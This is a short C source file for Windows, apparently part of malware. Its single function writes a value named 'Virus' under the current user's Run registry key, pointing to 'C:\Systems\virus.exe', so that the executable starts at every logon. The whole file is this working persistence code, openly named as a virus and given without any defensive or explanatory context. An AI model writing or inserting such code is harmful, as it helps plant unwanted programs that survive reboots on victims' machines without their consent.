#ifndef UNICODE
#define UNICODE
#endif 

#include <stdio.h>
#include <windows.h>

const BYTE PATH[] = "\"C:\\Systems\\virus.exe\"";
const int PATH_SIZE = sizeof(PATH);

void add_to_startup()
{
    HKEY hkey;
    
    RegCreateKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        (KEY_WRITE | KEY_READ),
        NULL,
        &hkey,
        NULL
   );

    RegSetValueExA(
        hkey,
        "Virus",
        0,
        REG_SZ,
        PATH,
        PATH_SIZE
   );

   RegCloseKey(hkey);
   return;
}